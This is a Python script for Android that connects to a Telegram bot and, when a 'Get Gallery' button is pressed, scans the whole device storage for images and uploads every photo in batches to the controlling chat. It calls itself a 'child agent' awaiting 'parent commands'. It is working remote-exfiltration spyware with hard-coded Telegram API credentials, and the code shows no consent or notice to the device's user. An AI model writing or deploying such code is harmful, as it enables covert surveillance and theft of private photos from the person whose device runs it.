# main.py
import os
import json
import asyncio
from telethon import TelegramClient, events, Button

# ================= CONFIG =================
CONFIG_PATH = os.path.join(os.path.dirname(__file__), "config.json")
with open(CONFIG_PATH, "r") as f:
    config = json.load(f)

BOT_TOKEN = config["BOT_TOKEN"]
CHAT_ID = config["CHAT_ID"]

# Image extensions
IMAGE_EXTS = (".jpg", ".jpeg", ".png", ".heic", ".webp")

# ================= FUNCTIONS =================
def list_all_photos():
    """Scan entire accessible storage for images."""
    files = []
    storage_root = "/storage/emulated/0"
    for root, dirs, filenames in os.walk(storage_root):
        for fn in filenames:
            if fn.lower().endswith(IMAGE_EXTS):
                path = os.path.join(root, fn)
                try:
                    mtime = os.path.getmtime(path)
                except:
                    mtime = 0
                files.append((mtime, path))
    files.sort(reverse=True)
    return [p for _, p in files]

async def send_gallery(client, batch_size=20):
    files = list_all_photos()
    if not files:
        await client.send_message(CHAT_ID, "No photos found in storage.")
        return

    await client.send_message(CHAT_ID, f"Sending {len(files)} photos in batches of {batch_size}...")

    # Send in batches
    for i in range(0, len(files), batch_size):
        batch = files[i:i+batch_size]
        media = []
        for fpath in batch:
            if os.path.exists(fpath):
                try:
                    media.append(fpath)
                except Exception as e:
                    print(f"Skipping {fpath}: {e}")
        if media:
            try:
                await client.send_file(CHAT_ID, media)
                await asyncio.sleep(1)  # Small delay between batches
            except Exception as e:
                print(f"Failed to send batch starting with {batch[0]}: {e}")

# ================= MAIN =================
async def main():
    # Your API credentials
    api_id = 22071176
    api_hash = '7ed5401b625a0a4d3c45caf12c87f166'

    client = TelegramClient('child_session', api_id, api_hash)
    await client.start(bot_token=BOT_TOKEN)

    # Send device connected message with button
    await client.send_message(
        CHAT_ID,
        "Device connected ✅",
        buttons=[Button.inline("Get Gallery", b"get_gallery")]
    )

    @client.on(events.CallbackQuery)
    async def callback(event):
        if event.sender_id != CHAT_ID:
            return
        if event.data == b"get_gallery":
            await event.answer("Sending all photos in batches...")
            await send_gallery(client)

    print("Child agent online — waiting for parent commands.")
    await client.run_until_disconnected()

if __name__ == "__main__":
    asyncio.run(main())
